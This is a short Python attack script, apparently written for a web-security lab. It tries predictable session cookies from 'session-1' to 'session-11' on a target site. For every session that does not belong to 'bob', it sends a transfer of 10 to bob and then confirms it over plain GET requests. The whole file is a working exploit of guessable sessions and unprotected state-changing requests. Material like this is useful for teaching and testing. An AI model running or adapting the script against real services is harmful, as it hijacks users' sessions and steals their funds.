import sys
import requests
import json


def test_transfer(address):
    for i in range(1, 12):
        session_id="session-"+str(i)
        response = requests.get(address + "/balance/", headers={'Cookie': f'sessionid={session_id}'})
        response_json = response.json()
        if response_json["username"] != 'bob':
            transfer_response = requests.get(address + "/transfer/?to=bob&amount=10", headers={'Cookie': f'sessionid={session_id}'})
            print(transfer_response.status_code)
            confirmation_response = requests.get(address + "/confirm/", headers={'Cookie': f'sessionid={session_id}'})
            print(confirmation_response)
    
    return None



def main(argv):
	address = sys.argv[1]
	print(test_transfer(address))

if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python3 %s address' % sys.argv[0])
	else:
		main(sys.argv)
